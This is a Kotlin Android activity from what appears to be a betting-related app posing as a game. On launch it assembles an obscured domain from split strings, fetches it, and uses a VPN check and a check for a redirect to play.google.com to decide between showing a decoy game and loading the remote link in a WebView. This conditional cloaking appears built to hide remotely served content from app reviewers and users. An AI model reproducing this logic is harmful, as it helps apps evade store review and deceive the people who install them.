package com.bets.sons.porting

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.Window
import androidx.appcompat.app.AppCompatActivity
import com.bets.sons.porting.databinding.ActivityLoadBinding
import com.bets.sons.porting.plug.act.GamActivity
import com.bets.sons.porting.plug.act.StartActivity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okio.IOException

class LoadActivity: AppCompatActivity() {
    private lateinit var binding: ActivityLoadBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadBinding.inflate(layoutInflater)
        supportRequestWindowFeature(Window.FEATURE_NO_TITLE)
        setContentView(binding.root)

//        startWeb("https://yandex.ru/")
        loadHttp(getLink())
    }

    private val dom = "hiring-vaunty"
    private val space = ".space"
    private fun getLink(): String {
        return "https://$dom$space"
    }


    private fun loadHttp(link: String) {
        if (!checkInet(this)) {
            startNoInet()
        } else {
            GlobalScope.launch(Dispatchers.IO) {
                val client = OkHttpClient()
                val req = Request.Builder()
                    .url(link)
                    .build()

                try {
                    client.newCall(req).execute().use { response ->
                        if (!response.isSuccessful) {
                            startGame()
                        }
                        if (isVPNActive(this@LoadActivity)) {
                            if (response.request.url.toString().contains("play.google.com")) {
                                startGame()
                            } else {
                                startWeb(link)
                            }
                            Log.d("Load url req", "---- ${response.request.url} ----")
                        } else {
                            startGame()
                        }
                    }
                } catch (e: IOException) {
                    println("Ошибка подключения: $e");
                }
            }
        }
    }

    fun isVPNActive(context: Context): Boolean {
        //this method doesn't work below API 21
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return false
        var vpnInUse = false
        val connectivityManager =
            context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val activeNetwork = connectivityManager.activeNetwork
            val caps = connectivityManager.getNetworkCapabilities(activeNetwork)
            return caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
        }
        val networks = connectivityManager.allNetworks
        for (i in networks.indices) {
            val caps = connectivityManager.getNetworkCapabilities(networks[i])
            if (caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                vpnInUse = true
                break
            }
        }
        return vpnInUse
    }


    private fun checkInet(context: Context): Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false
            return when {
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                else -> false
            }
        } else {
            @Suppress("DEPRECATION") val networkInfo =
                connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }


    private fun startWeb(html: String) = startActivity(Intent(this, WebViewActivity::class.java).putExtra("link", html))
    private fun startGame() = startActivity(Intent(this, StartActivity::class.java))
    private fun startNoInet() = startActivity(Intent(this, NoInetActivity::class.java))

}